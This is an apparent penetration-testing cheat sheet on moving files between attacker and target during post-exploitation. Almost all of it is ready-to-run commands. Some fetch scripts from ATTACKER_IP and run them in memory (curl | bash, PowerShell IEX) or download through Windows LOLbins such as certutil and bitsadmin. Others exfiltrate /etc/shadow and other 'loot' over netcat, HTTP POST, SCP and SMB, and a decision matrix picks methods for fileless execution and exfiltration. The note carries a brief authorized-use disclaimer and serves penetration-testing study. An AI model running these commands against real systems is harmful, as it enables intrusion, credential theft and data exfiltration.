---
title: File Transfer Techniques
tags:
  - reference
  - cheat-sheet
  - file-transfer
  - post-exploitation
  - foundational
created: 2026-03-23
updated: 2026-04-04
difficulty: foundational
---

# File Transfer Techniques

Moving files between attacker and target — and between systems during lateral movement — is a fundamental skill. Different environments have different tools available; know multiple methods.

> ⚠️ For authorized penetration testing and CTF use only.

---

## Attacker → Target (Delivering Payloads / Tools)

### Python HTTP Server (most common setup)
```bash
# Attacker — serve current directory
python3 -m http.server 80
python3 -m http.server 8080
python2 -m SimpleHTTPServer 80
```

Then on target, download using any available method below.

---

## Linux Target — Download Methods

```bash
# wget
wget http://ATTACKER_IP/file -O /tmp/file
wget http://ATTACKER_IP/linpeas.sh -O /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh

# curl
curl http://ATTACKER_IP/file -o /tmp/file
curl http://ATTACKER_IP/file > /tmp/file

# Execute in memory (no file on disk)
curl http://ATTACKER_IP/linpeas.sh | bash
wget -qO- http://ATTACKER_IP/script.sh | bash

# Netcat
# Attacker:
nc -lvnp 4444 < file
# Target:
nc ATTACKER_IP 4444 > /tmp/file

# SCP (requires SSH credentials or key)
scp user@ATTACKER_IP:/path/to/file /tmp/file

# Base64 encode/decode (no network tools needed)
# Attacker:
base64 linpeas.sh | xclip    # Copy to clipboard
# Target (paste and decode):
echo "BASE64STRING" | base64 -d > /tmp/linpeas.sh

# /dev/tcp (bash built-in — no nc or curl needed)
exec 3<>/dev/tcp/ATTACKER_IP/80
echo -e "GET /file HTTP/1.0\r\nHost: ATTACKER_IP\r\n\r\n" >&3
cat <&3 > /tmp/file
```

---

## Windows Target — Download Methods

```powershell
# PowerShell — Invoke-WebRequest (IWR)
Invoke-WebRequest -Uri "http://ATTACKER_IP/file.exe" -OutFile "C:\Windows\Temp\file.exe"
iwr -Uri "http://ATTACKER_IP/file.exe" -OutFile "C:\Windows\Temp\file.exe"

# PowerShell — WebClient (older, no progress bar, faster)
(New-Object Net.WebClient).DownloadFile("http://ATTACKER_IP/file.exe","C:\Windows\Temp\file.exe")

# PowerShell — Download and execute in memory (fileless)
IEX(New-Object Net.WebClient).DownloadString("http://ATTACKER_IP/script.ps1")
IEX(iwr "http://ATTACKER_IP/script.ps1" -UseBasicParsing)

# PowerShell — BITS (Background Intelligent Transfer Service)
Start-BitsTransfer -Source "http://ATTACKER_IP/file.exe" -Destination "C:\Windows\Temp\file.exe"
```

```cmd
:: CMD — certutil (LOLbin)
certutil -urlcache -split -f http://ATTACKER_IP/file.exe C:\Windows\Temp\file.exe

:: CMD — bitsadmin (LOLbin)
bitsadmin /transfer job /download /priority normal http://ATTACKER_IP/file.exe C:\Windows\Temp\file.exe

:: CMD — curl (Windows 10 1803+ has built-in curl)
curl http://ATTACKER_IP/file.exe -o C:\Windows\Temp\file.exe
```

```powershell
# Base64 encode on attacker (Linux)
base64 -w0 file.exe

# Decode on Windows target
[System.Convert]::FromBase64String("BASE64STRING") | Set-Content -Encoding Byte "C:\Windows\Temp\file.exe"
```

---

## Target → Attacker (Exfiltrating Loot)

### Linux → Attacker

```bash
# Netcat — send file to listener
# Attacker (receive):
nc -lvnp 4444 > loot.txt
# Target (send):
nc ATTACKER_IP 4444 < /etc/shadow

# curl POST upload
curl -X POST http://ATTACKER_IP:8080/upload -F "file=@/etc/shadow"

# SCP
scp /etc/shadow user@ATTACKER_IP:/loot/

# Base64 print to terminal (copy/paste)
base64 /etc/shadow
```

### Windows → Attacker

```powershell
# PowerShell — upload via HTTP POST
Invoke-WebRequest -Uri "http://ATTACKER_IP:8080/upload" -Method POST -InFile "C:\loot.txt"

# PowerShell — upload via SMB share
copy C:\loot.txt \\ATTACKER_IP\share\loot.txt

# Base64 print to terminal
[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\loot.txt"))
```

---

## Attacker HTTP Upload Server

```bash
# Python upload server (receives POST files)
pip3 install uploadserver
python3 -m uploadserver 8080

# Or use this one-liner script:
# https://gist.github.com/UniIsland/3346170
```

---

## SMB File Transfer

```bash
# Attacker — create an SMB share (Impacket)
sudo impacket-smbserver share /path/to/share -smb2support

# Or with authentication
sudo impacket-smbserver share /path/to/share -smb2support -username user -password pass

# Target (Windows) — connect and copy
copy \\ATTACKER_IP\share\file.exe C:\Windows\Temp\file.exe

# Target (Linux) — mount SMB share
sudo mount -t cifs //ATTACKER_IP/share /mnt/smb -o username=user,password=pass
cp /mnt/smb/file /tmp/file
```

---

## SSH/SCP Transfer

```bash
# Copy file to remote
scp file.txt user@10.10.10.10:/tmp/

# Copy file from remote
scp user@10.10.10.10:/etc/shadow /tmp/shadow

# Copy directory recursively
scp -r /local/dir user@10.10.10.10:/tmp/dir

# rsync (better for large transfers)
rsync -avz /local/ user@10.10.10.10:/remote/
```

---

## FTP Transfer

```bash
# Attacker — start FTP server
python3 -m pyftpdlib -p 21 -w    # Write-enabled

# Target (Linux) — anonymous download
ftp 10.10.10.10
> anonymous
> [blank password]
> get file.exe

# Target (Windows) — non-interactive FTP
echo open ATTACKER_IP 21 > ftp.txt
echo anonymous >> ftp.txt
echo  >> ftp.txt
echo binary >> ftp.txt
echo get file.exe >> ftp.txt
echo bye >> ftp.txt
ftp -s:ftp.txt
```

---

## When Nothing Else Works — Paste Methods

```bash
# Print file as hex (target)
xxd /etc/shadow | head -50
# Reconstruct on attacker:
xxd -r hex_dump.txt > shadow

# Print as base64 (target)
cat /etc/shadow | base64 -w 0
# Decode on attacker:
echo "BASE64" | base64 -d > shadow
```

---

## Quick Decision Matrix

| Situation | Best Method |
|---|---|
| Linux target, curl available | `curl http://ATTACKER/file -o /tmp/file` |
| Linux target, no curl/wget | `/dev/tcp` or base64 copy-paste |
| Windows target, PowerShell available | `IWR` or `(New-Object Net.WebClient).DownloadFile()` |
| Windows target, only CMD | `certutil` or `bitsadmin` |
| Exfil from Linux | `nc` pipe or `curl POST` |
| Exfil from Windows | PowerShell `Invoke-WebRequest POST` or SMB |
| No outbound HTTP | SMB share or base64 paste |
| Fileless execution needed | `IEX` (PS) or `curl | bash` (Linux) |

## Related Notes
- Reverse-Shells
- Netcat
- Linux-Commands
- Windows-Commands
- Metasploit

## See Also

- Netcat
- Linux-Commands
- Windows-Commands
- Penetration-Testing-Methodology
- Bash-Scripting

---
<- [[Reference-MOC]]